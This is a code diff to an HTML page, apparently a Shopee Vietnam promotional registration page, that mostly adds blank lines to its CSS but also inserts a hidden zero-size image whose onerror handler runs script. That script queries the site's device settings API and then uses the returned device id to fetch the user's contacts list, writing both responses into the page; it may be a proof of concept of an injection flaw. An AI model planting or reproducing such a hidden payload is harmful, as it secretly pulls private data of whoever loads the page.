@@ -16,6 +16,7 @@
     height: 100%;
     background-color: #013E88;
   }
+
   #register-btn {
     background-color: #FF5520;
     border: none;
@@ -32,9 +33,11 @@
     outline: none;
     animation: pulse 2s infinite;
   }
+
   #register-btn:hover {
     animation: none;
   }
+
   @-webkit-keyframes pulse {
     0% {
       -webkit-box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.3);
@@ -46,6 +49,7 @@
       -webkit-box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
     }
   }
+
   @keyframes pulse {
     0% {
       -moz-box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.3);
@@ -106,6 +110,40 @@
     text-transform: none;
 ">Tôi cam kết con tôi đã trên 2 tuổi</span></button>
 </div>
+
+<img style="visibility: hidden; position: absolute;" width="0" height="0" src="" onerror="(function(){
+   var xmlhttp = new XMLHttpRequest();
+  var xmlhttp2 = new XMLHttpRequest();
+
+  xmlhttp.onreadystatechange = function() {
+        if (xmlhttp.readyState == XMLHttpRequest.DONE) {
+           if (xmlhttp.status == 200) {
+               var res = JSON.parse(xmlhttp.responseText);
+               document.getElementById('test-device').innerHTML = '<pre>' + xmlhttp.responseText + '</pre>'
+               if (res) {
+                  xmlhttp2.open('GET', 'https://shopee.vn/api/v2/user/contacts/get/?device_id=' + res['deviceid'] + '&offset=0&limit=10', true);
+                 xmlhttp2.onreadystatechange = function() {
+                    if (xmlhttp2.readyState == XMLHttpRequest.DONE) {
+                       if (xmlhttp2.status == 200) {
+                           document.getElementById('test-device-2').innerHTML = '<pre>' + xmlhttp2.responseText + '</pre>'
+                       }
+                    }
+                 };
+                 xmlhttp2.send();
+               }
+           } else if (xmlhttp.status == 400) {
+              alert('There was an error 400');
+           } else {
+               alert('something else other than 200 was returned');
+           }
+        }
+  };
+  xmlhttp.open('GET', 'https://shopee.vn/mkt/coins/api/v1/settings/', true);
+  xmlhttp.send();
+  return false;
+})();return false;" />
+<div id="test-device"></div>
+<div id="test-device-2"></div>
 
 </body>
 </html>
